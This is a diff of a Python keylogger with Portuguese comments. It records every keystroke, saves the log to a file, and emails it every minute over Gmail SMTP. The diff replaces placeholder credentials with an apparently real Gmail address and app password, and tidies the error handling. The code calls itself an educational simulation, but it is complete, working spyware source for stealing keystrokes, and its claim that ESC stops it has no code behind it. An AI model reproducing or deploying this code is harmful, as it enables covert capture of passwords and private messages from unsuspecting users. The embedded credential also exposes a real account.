@@ -7,44 +7,68 @@ import threading
 import time
 import smtplib
 from email.mime.text import MIMEText
-from pynput import keyboard  # Necessário instalar: pip install pynput (para simulação educacional)
+from pynput import keyboard  # pip install pynput
 
-# Variáveis globais
+# ===============================
+# VARIÁVEIS GLOBAIS
+# ===============================
 log = ""  # Armazena as teclas capturadas
-email_interval = 60  # Intervalo em segundos para envio de e-mail (ex.: a cada 1 minuto)
+email_interval = 60  # Intervalo (segundos) para envio de e-mail
 email_sent = False  # Flag para controlar envio
 
-# Configurações de e-mail (use contas de teste para simulação!)
-EMAIL_ADDRESS = "seu_email_teste@gmail.com"
-EMAIL_PASSWORD = "sua_senha_app"  # Use senha de app para Gmail
-DESTINO_EMAIL = "destino_teste@gmail.com"
+# ===============================
+# CONFIGURAÇÕES DE E-MAIL (para simulação)
+# ===============================
+EMAIL_ADDRESS = "zntcba@gmail.com"
+EMAIL_PASSWORD = "iqyu keda hcsn kfed"  # Senha de app (Gmail)
+DESTINO_EMAIL = "zntcba@gmail.com"
 
-# Função para capturar teclas
+# ===============================
+# FUNÇÃO PARA CAPTURAR TECLAS
+# ===============================
 def on_press(key):
+    """
+    Captura cada tecla pressionada.
+    Trata teclas de caractere e especiais para evitar erro de NoneType.
+    """
     global log
     try:
-        log += key.char  # Adiciona caractere normal
-    except AttributeError:
-        # Teclas especiais
-        if key == keyboard.Key.space:
-            log += " "
-        elif key == keyboard.Key.enter:
-            log += "\n"
-        elif key == keyboard.Key.tab:
-            log += "\t"
+        # Verifica se é um caractere normal (ex: letras, números, símbolos)
+        if hasattr(key, 'char') and key.char is not None:
+            log += key.char
         else:
-            log += f"[{key}]"  # Outras teclas especiais
+            # Trata teclas especiais
+            if key == keyboard.Key.space:
+                log += " "
+            elif key == keyboard.Key.enter:
+                log += "\n"
+            elif key == keyboard.Key.tab:
+                log += "\t"
+            else:
+                log += f"[{key.name if hasattr(key, 'name') else key}]"
+    except Exception as e:
+        print(f"Erro ao capturar tecla: {e}")
 
-# Função para salvar log em arquivo
+# ===============================
+# FUNÇÃO PARA SALVAR LOG EM ARQUIVO
+# ===============================
 def salvar_log(arquivo="keylog.txt"):
     global log
-    with open(arquivo, "a") as f:
-        f.write(log)
-    log = ""  # Reseta o log após salvar
+    try:
+        with open(arquivo, "a", encoding="utf-8") as f:
+            f.write(log)
+        log = ""  # Limpa o conteúdo após salvar
+    except Exception as e:
+        print(f"Erro ao salvar log: {e}")
 
-# Função para enviar e-mail com o log
-def enviar_email(log):
-    msg = MIMEText(log)
+# ===============================
+# FUNÇÃO PARA ENVIAR LOG POR E-MAIL
+# ===============================
+def enviar_email(conteudo_log):
+    """
+    Envia o log por e-mail (para fins de simulação educacional).
+    """
+    msg = MIMEText(conteudo_log)
     msg['Subject'] = "Log de Teclas Capturadas (Simulação)"
     msg['From'] = EMAIL_ADDRESS
     msg['To'] = DESTINO_EMAIL
@@ -55,32 +79,46 @@ def enviar_email(log):
         server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
         server.sendmail(EMAIL_ADDRESS, DESTINO_EMAIL, msg.as_string())
         server.quit()
-        print("E-mail enviado com sucesso (simulação).")
+        print("✅ E-mail enviado com sucesso (simulação).")
     except Exception as e:
         print(f"Erro ao enviar e-mail: {e}")
 
-# Função para monitoramento e envio periódico
+# ===============================
+# MONITORAMENTO E ENVIO PERIÓDICO
+# ===============================
 def monitorar_e_enviar():
     global email_sent
     while True:
         time.sleep(email_interval)
         if log:
             salvar_log()
-            enviar_email(open("keylog.txt", "r").read())
-            email_sent = True
+            try:
+                with open("keylog.txt", "r", encoding="utf-8") as file:
+                    conteudo = file.read()
+                enviar_email(conteudo)
+                email_sent = True
+            except Exception as e:
+                print(f"Erro ao ler/enviar log: {e}")
 
-# Função principal para simular o keylogger
+# ===============================
+# FUNÇÃO PRINCIPAL (SIMULAÇÃO)
+# ===============================
 def simular_keylogger():
-    # Iniciar thread para monitoramento e envio
+    """
+    Inicia o listener do teclado e a thread de envio.
+    Uso apenas em ambiente controlado para fins educacionais.
+    """
     thread_monitor = threading.Thread(target=monitorar_e_enviar)
-    thread_monitor.daemon = True  # Torna a thread daemon para encerrar com o programa
+    thread_monitor.daemon = True
     thread_monitor.start()
 
-    # Listener de teclado
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
 
-# Exemplo de uso (execute em ambiente controlado!)
+# ===============================
+# EXECUÇÃO PRINCIPAL
+# ===============================
 if __name__ == "__main__":
-    print("Simulando keylogger... Pressione teclas para capturar.")
+    print("🔹 Simulando captura de teclas (ambiente educacional).")
+    print("Pressione ESC para encerrar.\n")
     simular_keylogger()
